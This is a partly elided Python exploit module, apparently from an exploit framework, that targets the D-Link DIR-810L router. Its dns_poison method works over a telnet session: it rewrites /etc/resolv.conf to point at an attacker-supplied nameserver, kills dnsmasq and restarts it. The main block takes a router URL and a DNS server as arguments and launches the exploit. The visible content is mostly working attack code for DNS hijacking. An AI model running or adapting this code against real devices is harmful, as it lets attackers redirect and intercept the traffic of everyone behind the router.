...
class dir_810l_rce(Exploit):
    ...
    def meta_info(self):
        return {
            ...
            'min_version': '',
            'max_version': '',
            'version_list': ['DIR-810L'],             #min_version,max_version 和 verion_list 二者必选其一
    ...
    def dns_poison(self,telnet_handle, new_dns_server='192.168.220.5', dns_conf_path='/etc/resolv.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        ...
        md_dns_conf_cmd = 'echo nameserver {} > {}'.format(new_dns_server,dns_conf_path)
        telnet_handle.sendone(md_dns_conf_cmd)
        self.report('Change DNS Configuration done.')

        telnet_handle.sendone("killall dnsmasq")
        telnet_handle.sendone(restart_cmd)
        self.report('Restart dnsmasq done.')
        return
...
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_810l_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = dir_810l_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
